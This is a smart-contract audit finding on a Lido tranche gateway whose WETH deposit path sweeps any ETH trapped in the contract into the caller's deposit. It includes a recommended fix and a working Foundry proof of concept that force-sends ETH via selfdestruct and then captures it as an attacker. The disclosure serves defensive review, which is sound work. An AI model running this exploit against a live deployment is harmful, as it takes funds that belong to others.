### Title
Trapped ETH is swept into attacker deposits through the WETH path - (File: `contracts/strategies/lido/LidoCDOTrancheGateway.sol`)

### Summary
`depositAAWithEthToken` and `depositBBWithEthToken` pull and unwrap the user-supplied WETH `amount`, but submit the gateway's entire ETH balance to Lido rather than the requested amount. [1](#0-0)  Any ETH already trapped in the gateway is therefore converted into stETH and credited as part of the caller's CDO deposit. [2](#0-1) 

### Finding Description
The WETH branch performs these operations:

1. Transfers `_amount` WETH from the caller. [3](#0-2) 
2. Calls `IWETH(wethToken).withdraw(_amount)`, increasing the gateway's ETH balance by the supplied amount. [4](#0-3) 
3. Calls `_mintStEth(address(this).balance)`, which also consumes ETH already held by the gateway. [5](#0-4) 
4. Deposits the resulting stETH and sends all minted tranche tokens to the caller. [2](#0-1) 

The contract explicitly expects to finish every transaction without residual funds. [6](#0-5)  Its `receive` function rejects ordinary ETH transfers except those originating from WETH, but it cannot prevent ETH from being force-sent by `selfdestruct`. [7](#0-6) 

### Impact Explanation
An unprivileged caller can claim tranche shares backed by trapped gateway ETH while supplying only the smaller WETH `amount`. This violates payment isolation: the amount credited to the caller exceeds the assets provided by that caller, and trapped donated or accidentally forced ETH is effectively stolen. [1](#0-0) [8](#0-7) 

### Likelihood Explanation
The attack is conditional on the gateway holding ETH. Ordinary ETH donations revert because `receive` only accepts the WETH contract as sender, but ETH can still be force-sent through a contract that self-destructs in its constructor. [7](#0-6)  Once such a balance exists, the next WETH deposit deterministically captures it; the attacker does not need a privileged role or control of the CDO. [9](#0-8) 

### Recommendation
Use only the ETH produced by the requested WETH withdrawal:

```solidity
uint256 ethBefore = address(this).balance;
IWETH(wethToken).withdraw(_amount);
amtToDeposit = _mintStEth(address(this).balance - ethBefore);
```

Alternatively, pass `_amount` directly to `_mintStEth`. Add a separate administrative recovery method if intentionally trapped ETH should remain recoverable without being credited to depositors.

### Proof of Concept

The following Foundry PoC runs against a mainnet fork and a deployed gateway configured with the production WETH, stETH and `IdleCDO` contracts. `GATEWAY` should point to that deployment.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "../../contracts/strategies/lido/LidoCDOTrancheGateway.sol";
import "../../contracts/interfaces/IWETH.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract ForceEther {
    constructor(address payable target) payable {
        // On post-Cancun forks, selfdestruct in the constructor still
        // transfers the new contract's balance to `target`.
        selfdestruct(target);
    }
}

contract GatewayTrappedEthTest is Test {
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    LidoCDOTrancheGateway gateway =
        LidoCDOTrancheGateway(payable(vm.envAddress("GATEWAY")));

    function testWethDepositSweepsTrappedEth() public {
        address attacker = makeAddr("attacker");
        uint256 trappedEth = 10 ether;
        uint256 attackerEth = 1 ether;

        // Seed the gateway with ETH despite its only-WETH receiver.
        new ForceEther{ value: trappedEth }(payable(address(gateway)));
        assertEq(address(gateway).balance, trappedEth);

        // The attacker supplies only `attackerEth`.
        vm.deal(attacker, attackerEth);
        vm.startPrank(attacker);
        IWETH(WETH).deposit{ value: attackerEth }();
        IERC20(WETH).approve(address(gateway), attackerEth);

        address aaTranche = gateway.idleCDO().AATranche();
        uint256 priceBefore = gateway.idleCDO().virtualPrice(aaTranche);
        uint256 suppliedOnlyValue = attackerEth;
        uint256 minted = gateway.depositAAWithEthToken(WETH, attackerEth);
        vm.stopPrank();

        // All trapped ETH plus the attacker's ETH was submitted to Lido.
        assertEq(address(gateway).balance, 0);
        assertEq(IERC20(aaTranche).balanceOf(attacker), minted);

        // The received tranches are worth materially more than the 1 ETH
        // supplied by the attacker. Exact equality is not required because
        // Lido share conversion may differ by a small rounding amount.
        uint256 valueReceived = minted * priceBefore / 1e18;
        assertGt(valueReceived, suppliedOnlyValue + trappedEth * 99 / 100);
    }
}
```
